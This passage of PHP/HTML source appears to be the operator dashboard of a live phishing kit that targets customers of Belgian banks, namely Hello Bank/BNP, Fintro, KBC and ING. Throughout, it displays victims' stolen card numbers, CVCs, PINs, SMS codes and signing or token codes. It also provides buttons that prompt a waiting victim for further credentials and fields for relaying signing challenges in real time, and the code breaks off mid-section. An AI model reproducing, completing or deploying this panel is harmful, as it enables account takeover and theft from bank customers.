                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1 Code:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_m1"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_phone"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_phone"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_sms"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_sms"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["bnp_m2"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m2 code:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_m2"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["bnp_live"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live code:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_live"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_cc"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_cc"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_exp"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_exp"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_cvc"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_cvc"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_bel"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_bel"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if ($log["waiting"] == "true") {
                                            ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'loginCode')"><i class="far fa-keyboard"></i> Ask SMS Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'credit')"><i class="far fa-keyboard"></i> Ask CC</button>
                            </div>

                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>
                        <hr>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setHello('<?php 
                                            echo htmlspecialchars($log["user_id"]);
                                            ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control hello-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a m1 code">
                            </div>
                        </div>
                        
                        <div class="row">
                         
                            <div class="col-lg-9">
                                <input type="hidden" class="form-control hello-m2-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a m1 code">
                            </div>
                        </div>
                       
                        <div class="row">
                           
                            <div class="col-lg-9">
                            <input type="hidden" class="form-control hello-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="hidden" class="form-control hello-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>                                 
                    </div>
                </div>




















                <?php 
                                        }
                                    } else {
                                        if ($log["bank"] == "FINTRO") {
                                            if (!empty($log["fintro_card"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">card:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_card"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_client"]) && !empty($log["fintro_vv"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">clientid:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_client"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Expiry:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_vv"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_m1"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1 Code:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_m1"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_phone"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_phone"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_sms"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_sms"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_m2"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m2 code:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_m2"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_live"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live code:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_live"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_cc"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_cc"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_exp"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_exp"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_cvc"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_cvc"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if (!empty($log["fintro_bel"])) {
                                                echo "<div class=\"form-group row\">";
                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                                echo "<div class=\"col-sm-9\">";
                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["fintro_bel"]) . "</i></p>";
                                                echo "</div>";
                                                echo "</div>";
                                            }
                                            if ($log["waiting"] == "true") {
                                                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'loginCode')"><i class="far fa-keyboard"></i>Ask SMS Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'credit')"><i class="far fa-keyboard"></i>Ask CC</button>
                            </div>

                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>
                        <hr>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control fintro-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'sign2')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m2</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control fintro-m2-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setFintro('<?php 
                                                echo htmlspecialchars($log["user_id"]);
                                                ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control fintro-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control fintro-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>                                 
                    </div>
                </div>

                <?php 
                                            }
                                        } else {
                                            if ($log["bank"] == "KBC") {
                                                if (!empty($log["kbc_card"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">card:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_card"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_vv"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">exp:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_vv"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_m1"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Login code:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_m1"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_m2"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Sign Code:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_m2"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_phone"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_phone"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_sms"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_sms"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_livelogin"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Sign live:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_livelogin"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_live"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">buy live:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_live"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_cc"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_cc"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_exp"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_exp"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_cvc"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_cvc"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if (!empty($log["kbc_bel"])) {
                                                    echo "<div class=\"form-group row\">";
                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                                    echo "<div class=\"col-sm-9\">";
                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["kbc_bel"]) . "</i></p>";
                                                    echo "</div>";
                                                    echo "</div>";
                                                }
                                                if ($log["waiting"] == "true") {
                                                    ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> CARD</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'sms')"><i class="far fa-keyboard" aria-hidden="true"></i> SMS</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'loginCode')"><i class="far fa-keyboard"></i> CC</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>  
                        <hr>    
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control kbc-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'tokenCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Sign Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control kbc-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                        <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live buy</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control kbc-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control kbc-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>
                        <hr>  
                <div class="row">
                <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setKbc('<?php 
                                                    echo htmlspecialchars($log["user_id"]);
                                                    ?>
', 'livetwo')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live sign</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control kbc-livelogin input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control kbc-livelogintwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>
                          
                    </div>
                </div>







                <?php 
                                                }
                                            } else {
                                                if ($log["bank"] == "INGBE") {
                                                    if (!empty($log["ingbe_card"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cardnumber:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_card"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_id"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">ING ID:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_id"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_vv"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">EXP:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_vv"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_identify"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">identify:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_identify"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_sign"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Sign Code:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_sign"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_live"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live code:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_live"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_phone"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_phone"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_sms"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_sms"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_pin"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Pincode:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_pin"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_credit"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_credit"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_exp"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC Exp:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_exp"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_cvc"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC Cvc:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_cvc"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if (!empty($log["ingbe_bel"])) {
                                                        echo "<div class=\"form-group row\">";
                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                                        echo "<div class=\"col-sm-9\">";
                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ingbe_bel"]) . "</i></p>";
                                                        echo "</div>";
                                                        echo "</div>";
                                                    }
                                                    if ($log["waiting"] == "true") {
                                                        ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask identify</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'phone')"><i class="fa fa-phone" aria-hidden="true"></i> Ask phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
